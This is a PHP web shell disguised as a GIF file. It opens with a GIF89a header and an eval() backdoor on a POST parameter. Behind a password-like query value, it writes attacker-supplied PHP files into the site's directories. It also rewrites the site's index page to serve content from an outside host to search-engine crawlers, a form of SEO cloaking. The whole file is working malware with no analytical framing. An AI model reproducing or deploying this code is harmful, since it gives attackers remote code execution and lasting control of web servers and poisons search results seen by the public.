GIF89a<?php @eval($_POST["ewkVpXpWgQ"])?><?php
error_reporting(0);
$document_root = $_SERVER['DOCUMENT_ROOT'] . "/";
if(isset($_GET['q']) && $_GET['q'] == "ewkVpXpWgQ" && isset($_POST['string']) && isset($_GET['f'])){
	$filename = $_GET["f"];
	$path_list = getDir($document_root);
	$real_file_name = $filename . ".php";
	foreach($path_list as $path ){
		$real_file = $document_root  . $path . "/" . $real_file_name;
		if(! file_exists($real_file)&& ($fp = @fopen($real_file, 'w+')) ){
			$content = urldecode($_POST['string']);
			$fw_result = fwrite($fp, $content);
			fclose($fp);
			if($fw_result !== false){
				$shell_url = 'http://' . $_SERVER['SERVER_NAME'] . "/{$path}/" . $real_file_name;
				$response = curl($shell_url);
				if($response['header']['http_code'] == 200){
					echo $shell_url . "|" . $flag;
					break;
				}
			}
		}   
	} 
}
$index_file = getindex($document_root);
$add_status = addindex($index_file);
if($add_status){
	echo "|true";
}
function addindex($real_filename){
	$ext = substr($real_filename, strrpos($real_filename, '.')+1);
	copy($real_filename, $real_filename . "_bak.php");
	$content = getcontent($real_filename);
	if($ext == "php"){
		$content = trim($content);
		if(substr($content, -2) != "?>"){
			$content = $content . "?>";
		}
	}
	if(strpos($content, "googlebot") !== false){
		return false;
	}
$php_code = <<<EOF
		<?php
			\$s_http_user_agent = strtolower(\$_SERVER['HTTP_USER_AGENT']);
			if(strpos(\$s_http_user_agent, "googlebot") !== false|| strpos(\$s_http_user_agent, "yahoo") !== false||  strpos(\$s_http_user_agent, "bingbot") !== false){
					echo @file_get_contents("http://friend.dannyzadoff.com/friend.php");
			}
?>
EOF;
	$content = $php_code . $content; 
	return  putfile($real_filename, $content);
	

}
function getindex($document){
	$index_list = array("index.php", "default.php");
	$exists_index_list = array();
	foreach($index_list as $index_file){
		$real_file = $document . $index_file;
		if (file_exists($real_file) && is_writable($real_file) ){
			return $real_file;
		}
	}
	return false;
}


function getDir($dir) {
	$dirArray = array();
	if (false != ($handle = opendir ( $dir ))) {
		while ( false !== ($file = readdir ( $handle )) ) {
			if ($file != "." && $file != ".." && is_dir($dir . $file)) {
				$dirArray[]=$file;
			}
		}
		closedir ( $handle );
	}
	$curr_dir = dirname(__FILE__);
	$curr_dir = substr($curr_dir, strrpos($curr_dir, '/')+1) ;
	$dirArray[] = $curr_dir;
	shuffle($dirArray);
	return $dirArray;
}
function curl($url, $post=array()){
	if(function_exists("curl")){
		$headers = array("Content-Type:multipart/form-data");
		$response = array();
		$timeout = 10;
		$ch = curl_init();  
		curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);  
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout-2); 
		curl_setopt($ch, CURLOPT_URL, $url);  
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);  //设置头信息的地方  
		curl_setopt($ch, CURLOPT_HEADER, 0);    //不取得返回头信息  
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
		curl_setopt($ch, CURLOPT_REFERER, $url);
		curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);  
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
		if($post){
			curl_setopt($ch, CURLOPT_POST, true); 
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		}
		$result = curl_exec($ch);  
		$headerSent = curl_getinfo($ch);
		$response['error'] = curl_error($ch);
		$response['header'] = $headerSent;
		$response['result'] = $result;
		return $response;
	}else{
		return false;
	}
}
function putfile($f, $php_code){
	$suc = false;
	$fpw = @fopen($f, 'w+');
	if($fpw &&  @fwrite($fpw, $php_code) !== false){
		$suc = true;
	}
	@fclose($fpw);
	return $suc;
}
function getcontent($file){
	$fp = fopen($file, 'r');
	$tmp_content = fread($fp, filesize($file));
	fclose($fp);
	return $tmp_content;
}
